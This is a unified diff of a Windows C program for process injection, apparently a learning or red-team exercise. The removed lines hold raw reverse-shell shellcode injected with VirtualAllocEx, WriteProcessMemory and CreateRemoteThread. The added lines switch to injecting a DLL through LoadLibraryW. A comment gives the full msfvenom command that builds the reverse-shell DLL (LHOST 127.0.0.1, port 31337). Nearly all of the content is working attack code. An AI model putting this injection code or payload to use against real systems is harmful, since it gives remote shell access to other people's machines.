@@ -9,52 +9,13 @@
 #include <stdio.h>
 
 int main(int argc, char *argv[]) {
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    DWORD pid;
 
     // Reverse shell to 127.0.0.1:31337
     // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
-    unsigned char shellcode[] =
-        "\xCC"
-        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
-        "\xff\xff\x48\xbb\xf8\xdd\xaa\x59\x95\x1f\x0d\x50\x48\x31\x58"
-        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x95\x29\xbd\x65\xf7"
-        "\xcd\x50\xf8\xdd\xeb\x08\xd4\x4f\x5f\x01\xae\x95\x9b\x8b\xf0"
-        "\x57\x86\x02\x98\x95\x21\x0b\x8d\x57\x86\x02\xd8\x95\x21\x2b"
-        "\xc5\x57\x02\xe7\xb2\x97\xe7\x68\x5c\x57\x3c\x90\x54\xe1\xcb"
-        "\x25\x97\x33\x2d\x11\x39\x14\xa7\x18\x94\xde\xef\xbd\xaa\x9c"
-        "\xfb\x11\x1e\x4d\x2d\xdb\xba\xe1\xe2\x58\x45\x94\x8d\xd8\xf8"
-        "\xdd\xaa\x11\x10\xdf\x79\x37\xb0\xdc\x7a\x09\x1e\x57\x15\x14"
-        "\x73\x9d\x8a\x10\x94\xcf\xee\x06\xb0\x22\x63\x18\x1e\x2b\x85"
-        "\x18\xf9\x0b\xe7\x68\x5c\x57\x3c\x90\x54\x9c\x6b\x90\x98\x5e"
-        "\x0c\x91\xc0\x3d\xdf\xa8\xd9\x1c\x41\x74\xf0\x98\x93\x88\xe0"
-        "\xc7\x55\x14\x73\x9d\x8e\x10\x94\xcf\x6b\x11\x73\xd1\xe2\x1d"
-        "\x1e\x5f\x11\x19\xf9\x0d\xeb\xd2\x91\x97\x45\x51\x28\x9c\xf2"
-        "\x18\xcd\x41\x54\x0a\xb9\x85\xeb\x00\xd4\x45\x45\xd3\x14\xfd"
-        "\xeb\x0b\x6a\xff\x55\x11\xa1\x87\xe2\xd2\x87\xf6\x5a\xaf\x07"
-        "\x22\xf7\x10\x2b\x68\x7e\x62\xa7\xee\x98\x59\x95\x5e\x5b\x19"
-        "\x71\x3b\xe2\xd8\x79\xbf\x0c\x50\xf8\x94\x23\xbc\xdc\xa3\x0f"
-        "\x50\x82\xb4\xd5\x59\x95\x1e\x4c\x04\xb1\x54\x4e\x15\x1c\xee"
-        "\x4c\xea\xb4\xaa\x8c\x5e\x6a\xca\x41\xd9\x12\xb5\xab\x58\x95"
-        "\x1f\x54\x11\x42\xf4\x2a\x32\x95\xe0\xd8\x00\xa8\x90\x9b\x90"
-        "\xd8\x2e\xcd\x18\x07\x1d\xe2\xd0\x57\x57\xf2\x90\xb0\x54\x6b"
-        "\x18\x2f\xf5\x02\x8f\x18\x22\x7f\x11\x1c\xd8\x67\x40\xb9\x85"
-        "\xe6\xd0\x77\x57\x84\xa9\xb9\x67\x33\xfc\xe1\x7e\xf2\x85\xb0"
-        "\x5c\x6e\x19\x97\x1f\x0d\x19\x40\xbe\xc7\x3d\x95\x1f\x0d\x50"
-        "\xf8\x9c\xfa\x18\xc5\x57\x84\xb2\xaf\x8a\xfd\x14\xa4\xdf\x67"
-        "\x5d\xa1\x9c\xfa\xbb\x69\x79\xca\x14\xdc\x89\xab\x58\xdd\x92"
-        "\x49\x74\xe0\x1b\xaa\x31\xdd\x96\xeb\x06\xa8\x9c\xfa\x18\xc5"
-        "\x5e\x5d\x19\x07\x1d\xeb\x09\xdc\xe0\xc5\x1d\x71\x1c\xe6\xd0"
-        "\x54\x5e\xb7\x29\x34\xe2\x2c\xa6\x40\x57\x3c\x82\xb0\x22\x60"
-        "\xd2\x9b\x5e\xb7\x58\x7f\xc0\xca\xa6\x40\xa4\xfd\xe5\x5a\x8b"
-        "\xeb\xe3\x33\x8a\xb0\xcd\x07\x08\xe2\xda\x51\x37\x31\x56\x84"
-        "\xd7\x2a\xa2\x75\x6a\x08\xeb\xbf\xce\xd8\x36\xff\x1f\x54\x11"
-        "\x71\x07\x55\x8c\x95\x1f\x0d\x50"
-        "\xCC"
-        "\xC3";
-
-    HANDLE processHandle;
-    HANDLE remoteThread;
-    PVOID remoteBuffer;
-    DWORD pid;
+    wchar_t dllPath[] = TEXT(".\\reverse.dll");
 
     // Get a PID, error out if improper input for PID
      if(!argv[1] || !(pid=atoi(argv[1]))) {
@@ -66,19 +27,17 @@ int main(int argc, char *argv[]) {
     pid = GetCurrentProcessId();
 
     // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);                                                            // Open the process with enough permission to create a remote thread
-    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Allocate enough space in the new process for our shellcode
-    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);                                     // Write the shellcode into the space we allocated for it
-    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);         // Create a thread and start it at the space we allocated and mapped the shellcode to
-    WaitForSingleObject(remoteThread, INFINITE);                                                                            // Wait for the thread to finish
-    VirtualFreeEx(processHandle, remoteBuffer, sizeof shellcode, MEM_RELEASE);                                              // Free the memory we allocated
-    CloseHandle(processHandle);                                                                                             // Close handle since we are no longer using it
-
-    // speeeeeeeeeeeeeeen waiting for crash (debug)
-    for (int i = 0; i < 120; i++) {
-        printf("Waiting %d...\n", i+1);
-        Sleep(1000);
-    }
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    printf("Process handle: %p\n", processHandle);
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    printf("Remote buffer : %p\n", remoteBuffer);
+    int temp = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+    printf("Wrote memory  : %d\n", temp);
+    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+    printf("Thread address: %p\n", threadStartRoutineAddress);
+    PVOID temp2 = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
+    printf("Remote address: %p\n", temp2);
+    CloseHandle(processHandle);
 
     return 0;
 }
